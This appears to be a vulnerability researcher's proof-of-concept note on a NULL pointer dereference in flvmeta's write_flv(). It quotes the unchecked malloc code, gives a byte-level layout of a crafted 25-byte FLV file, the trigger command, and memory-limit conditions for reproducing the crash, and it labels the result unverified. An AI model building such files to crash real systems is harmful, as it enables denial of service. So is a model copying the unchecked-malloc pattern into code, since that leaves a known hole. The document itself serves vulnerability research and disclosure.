# VULN 001 PoC Notes: CWE-476 NULL Pointer Dereference in write_flv()

## Vulnerability Summary

**Location**: `write_flv()` in `src/update.c`, line 103  
**CWE**: CWE-476 (NULL Pointer Dereference)  
**Trigger**: `malloc()` return value not checked; NULL pointer passed to `fread()`

## Vulnerable Code Path

```c
// update.c:103 - malloc return value NOT checked
copy_buffer = (byte *)malloc(info->biggest_tag_body_size + FLV_TAG_SIZE);

// ...enters while loop immediately regardless of copy_buffer value...
while (flv_read_tag(flv_in, &ft) == FLV_OK) {
    // ...
    // update.c:208 - copy_buffer (potentially NULL) passed directly
    read_body = flv_read_tag_body(flv_in, copy_buffer, body_length);
}
```

```c
// flv.c:342 - fread with NULL buffer -> SIGSEGV
size_t flv_read_tag_body(flv_stream * stream, void * buffer, size_t buffer_size) {
    // ...no NULL check on buffer...
    bytes_number = fread(buffer, sizeof(byte), bytes_number, stream->flvin);
    //                  ^^^^^^ NULL if malloc failed -> crash
}
```

## PoC FLV File Design (vuln_001.flv, 25 bytes)

The file declares a video tag with `body_length = 0xFFFFFF` (16,777,215 bytes = ~16MB):

```
Offset  Size  Value        Description
------  ----  -----------  ---------------------------
0       3     46 4C 56     FLV signature "FLV"
3       1     01           Version 1
4       1     01           TypeFlags: video present
5       4     00 00 00 09  DataOffset = 9 (header size)
9       4     00 00 00 00  PreviousTagSize0 = 0
13      1     09           Tag type = VIDEO (0x09)
14      3     FF FF FF     body_length = 0xFFFFFF (~16MB declared)
17      3     00 00 00     Timestamp = 0
20      1     00           TimestampExtended = 0
21      3     00 00 00     StreamId = 0
24      1     22           Video flags: frame_type=2 (inter), codec_id=2 (H.263)
```

Key design choices:
- **body_length = 0xFFFFFF**: Set in the tag header. During the first pass (`flv_get_info()`),
  `biggest_tag_body_size` is set from the declared `body_length` field (not actual file size).
  This makes `malloc(0xFFFFFF + 11) = malloc(16,777,226)` (~16MB) be called in `write_flv()`.
- **frame_type = 2 (inter frame)**: Non-keyframe avoids `compute_video_size()` call, allowing
  the first pass to complete without needing actual video codec data.
- **Only 1 byte of body data**: The first pass uses `lfs_fseek(SEEK_SET)` to skip tag bodies
  (absolute seek, not dependent on actual data), so the file need not contain 16MB of data.
- **Command**: `flvmeta -U vuln_001.flv /dev/null` (the `-U` flag triggers `update_metadata()`
  which calls `write_flv()`)

## Exploit Chain

1. `flvmeta -U` calls `update_metadata()` → `write_flv()`
2. First pass (`flv_get_info()`): reads tag header, sets `biggest_tag_body_size = 0xFFFFFF`
   - Seeks over body with `lfs_fseek(SEEK_SET)` (tolerant of EOF)
   - Returns FLV_ERROR_EOF after one tag, which is handled
3. `write_flv()` called:
   - Line 103: `malloc(0xFFFFFF + 11)` → returns NULL if memory constrained
   - Line 103 result is stored in `copy_buffer` with NO NULL check
   - Loop enters, reads the same video tag via `flv_read_tag()`
   - Line 208: `flv_read_tag_body(flv_in, NULL, 0xFFFFFF)` called
   - `flv.c:342`: `fread(NULL, 1, N, stream)` → **SIGSEGV / ASAN null-dereference**

## Verification Status

**UNVERIFIED** in this test environment.

The code path IS confirmed reachable:
- Without ulimit: `flvmeta` processes the FLV and returns exit code 3 (`ERROR_EOF`)
  from `write_flv()` (after `malloc` succeeds and `read_body < body_length`)
  This confirms `write_flv()` is invoked and `flv_read_tag_body()` is called.
- With ulimit: The ASAN build dynamically links `libasan.so`, which requires ~256MB of
  virtual address space for shadow memory initialization. Small `ulimit -v` values cause
  ASAN itself to fail before any user code runs.

## Why This is Hard to Trigger in Test Environment

The binary at `build_test/src/flvmeta` is dynamically linked against `libasan.so`.
ASAN initializes by mapping a shadow memory region: on 64-bit Linux it attempts to
reserve ~15TB, falling back to ~256MB (0x10000000 bytes). Any `ulimit -v < ~500MB`
kills ASAN initialization, not the malloc in `write_flv()`.

To reliably trigger this vulnerability in practice:
1. **Non-ASAN binary** + `ulimit -v 30000` (30MB): allows the program to start but makes
   `malloc(16MB)` fail → `copy_buffer = NULL` → `fread(NULL, ...)` → SIGSEGV
2. **System-wide memory pressure** (cgroups memory limit) with the ASAN binary
3. **Target platform** with limited heap (embedded, 32-bit systems)
